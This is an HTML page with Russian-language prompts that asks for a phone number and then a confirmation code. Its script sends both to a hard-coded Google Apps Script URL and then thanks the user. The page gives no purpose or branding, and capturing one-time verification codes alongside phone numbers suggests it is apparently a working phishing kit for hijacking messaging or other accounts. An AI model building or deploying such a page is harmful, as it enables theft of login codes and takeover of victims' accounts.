<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Форма</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 30px;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Введите номер</h2>
    <input type="text" id="phone" placeholder="+374..." />
    <button onclick="savePhone()">Отправить номер</button>

    <div id="codeSection" style="display:none;">
      <h2>Введите код</h2>
      <input type="text" id="code" placeholder="Код подтверждения" />
      <button onclick="saveCode()">Отправить код</button>
    </div>
  </div>

  <script>
    let savedPhone = '';
    const url = "(https://script.google.com/macros/s/AKfycbwal1z5vb83DWh-hBFiNtQYcOFs-lDoAu9oq6juom3sYyCq9ykmHUy_2ThH8zfZo6N-qg/exec)"; // Вставь сюда скопированную ссылку

    function savePhone() {
      const phone = document.getElementById("phone").value.trim();
      if (!phone) return alert("Введите номер");
      savedPhone = phone;
      document.getElementById("codeSection").style.display = "block";

      // Сохраняем номер без кода
      fetch(url, {
        method: "POST",
        body: JSON.stringify({ phone: phone, code: "" }),
        headers: { "Content-Type": "application/json" }
      });
    }

    function saveCode() {
      const code = document.getElementById("code").value.trim();
      if (!code) return alert("Введите код");

      // Сохраняем код вместе с номером
      fetch(url, {
        method: "POST",
        body: JSON.stringify({ phone: savedPhone, code: code }),
        headers: { "Content-Type": "application/json" }
      }).then(() => {
        alert("Спасибо! Данные сохранены.");
      });
    }
  </script>
</body>
</html>
